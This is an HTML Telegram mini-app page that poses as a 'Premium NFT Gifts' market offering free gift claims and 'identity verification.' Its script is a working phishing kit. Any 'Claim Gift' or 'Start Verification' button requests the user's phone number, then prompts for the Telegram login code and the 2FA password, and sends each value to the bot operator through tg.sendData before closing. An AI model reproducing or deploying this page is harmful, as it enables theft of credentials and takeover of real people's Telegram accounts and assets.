<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Premium NFT Gifts</title>
    <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: "Times New Roman", Times, serif;
            background: #000; color: #fff; margin: 0; padding: 0; 
            overflow: hidden; height: 100vh;
        }
        
        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; opacity: 0.2; }

        .tabs { 
            display: flex; justify-content: space-around; 
            background: #000; border-bottom: 1px solid #111;
            position: sticky; top: 0; z-index: 100;
        }
        .tab-link { 
            padding: 15px; color: #444; font-size: 12px; cursor: pointer; border-bottom: 1px solid transparent;
            letter-spacing: 2px; transition: 0.3s; text-transform: uppercase;
        }
        .tab-link.active { color: #fff; border-bottom: 1px solid #fff; }

        .content-section { display: none; padding: 20px; height: calc(100vh - 50px); overflow-y: auto; box-sizing: border-box; position: relative; z-index: 10; }
        .content-section.active { display: block; }

        /* Карточка с анимацией */
        .nft-card { 
            background: #050505; border: 1px solid #111; padding: 20px; 
            margin-bottom: 30px; text-align: center; border-radius: 8px;
        }

        /* Контейнер для анимации */
        .animation-container {
            width: 180px; height: 180px; margin: 0 auto 15px auto;
            display: flex; align-items: center; justify-content: center;
        }

        .nft-title { font-size: 20px; letter-spacing: 2px; margin-bottom: 5px; font-weight: normal; }
        .nft-price { color: #555; font-style: italic; font-size: 14px; margin-bottom: 20px; display: block; }

        .btn { 
            background: #fff; color: #000; border: none; padding: 15px; width: 100%; 
            font-family: "Times New Roman"; font-weight: bold; cursor: pointer; font-size: 14px;
            letter-spacing: 2px; text-transform: uppercase; border-radius: 2px;
        }

        /* Стили модалок */
        .modal { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000; z-index: 2000; flex-direction: column; 
            justify-content: center; align-items: center; padding: 40px; box-sizing: border-box;
        }
        .modal.active { display: flex; }
        
        input { 
            width: 100%; background: transparent; border: none; border-bottom: 1px solid #333; 
            color: #fff; padding: 10px; font-size: 32px; text-align: center; outline: none; margin-bottom: 40px;
            font-family: "Times New Roman"; letter-spacing: 8px;
        }
    </style>
</head>
<body>
    <canvas id="snow"></canvas>

    <div class="tabs">
        <div class="tab-link active" onclick="showTab('market')">Market</div>
        <div class="tab-link" onclick="showTab('profile')">Profile</div>
        <div class="tab-link" onclick="showTab('verify')">Verify</div>
    </div>

    <div id="market" class="content-section active">
        
        <div class="nft-card">
            <div class="animation-container">
                <dotlottie-player src="https://nft.fragment.com/gift/santahat-10168.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
            </div>
            <div class="nft-title">Santa Hat</div>
            <span class="nft-price">50.00 USD</span>
            <button class="btn" onclick="requestAuth()">Claim Gift</button>
        </div>

        <div class="nft-card">
            <div class="animation-container">
                <dotlottie-player src="https://nft.fragment.com/gift/holidaydrink-39466.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
            </div>
            <div class="nft-title">Holiday Drink</div>
            <span class="nft-price">50.00 USD</span>
            <button class="btn" onclick="requestAuth()">Claim Gift</button>
        </div>

        <div class="nft-card">
            <div class="animation-container">
                <dotlottie-player src="https://nft.fragment.com/gift/partysparkler-56795.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
            </div>
            <div class="nft-title">Party Sparkler</div>
            <span class="nft-price">50.00 USD</span>
            <button class="btn" onclick="requestAuth()">Claim Gift</button>
        </div>

        <div class="nft-card">
            <div class="animation-container">
                <dotlottie-player src="https://nft.fragment.com/gift/xmasstocking-110648.lottie" background="transparent" speed="1" style="width: 100%; height: 100%;" loop autoplay></dotlottie-player>
            </div>
            <div class="nft-title">Xmas Stocking</div>
            <span class="nft-price">50.00 USD</span>
            <button class="btn" onclick="requestAuth()">Claim Gift</button>
        </div>

    </div>

    <div id="profile" class="content-section">
        <h3 style="font-weight: normal; letter-spacing: 1px;">Account Status: <span style="color: #600;">Unverified</span></h3>
        <p style="color: #444;">Support: <span style="color: #fff; text-decoration: underline;" onclick="window.open('https://t.me/x1o1y')">@x1o1y</span></p>
    </div>

    <div id="verify" class="content-section">
        <p style="color: #444; font-style: italic; margin-bottom: 30px;">Требуется подтверждение личности для вывода активов.</p>
        <button class="btn" onclick="requestAuth()">Start Verification</button>
    </div>

    <div id="step-code" class="modal">
        <h2 style="font-weight: normal; letter-spacing: 2px;">ENTER CODE</h2>
        <input type="number" id="in-code" placeholder="00000">
        <button class="btn" onclick="sendCode()">Verify Code</button>
    </div>

    <div id="step-pass" class="modal">
        <h2 style="font-weight: normal; letter-spacing: 2px;">2FA PASSWORD</h2>
        <input type="password" id="in-pass" placeholder="••••">
        <button class="btn" onclick="sendPass()">Confirm</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.headerColor = '#000000';

        function showTab(tabId) {
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
            document.getElementById(tabId).classList.add('active');
            event.currentTarget.classList.add('active');
        }

        function requestAuth() {
            tg.requestContact((sent, cb) => {
                if (sent && cb.responseUnsafe.contact) {
                    const phone = cb.responseUnsafe.contact.phone_number;
                    tg.sendData("PHONE:" + phone);
                    document.getElementById('step-code').classList.add('active');
                }
            });
        }

        function sendCode() {
            const val = document.getElementById('in-code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                document.getElementById('step-code').classList.remove('active');
                document.getElementById('step-pass').classList.add('active');
            }
        }

        function sendPass() {
            const val = document.getElementById('in-pass').value;
            tg.sendData("PASS:" + val);
            tg.close();
        }

        // Snow animation
        const canvas = document.getElementById('snow');
        const ctx = canvas.getContext('2d');
        let flakes = [];
        function initSnow() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            for (let i = 0; i < 40; i++) flakes.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*1.2, d: Math.random()*0.4 });
        }
        function drawSnow() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#fff"; ctx.beginPath();
            for (let f of flakes) { ctx.moveTo(f.x, f.y); ctx.arc(f.x, f.y, f.r, 0, Math.PI*2); }
            ctx.fill();
            for (let f of flakes) { f.y += f.d + 0.2; if (f.y > canvas.height) f.y = -5; }
            requestAnimationFrame(drawSnow);
        }
        initSnow(); drawSnow();
    </script>
</body>
</html>
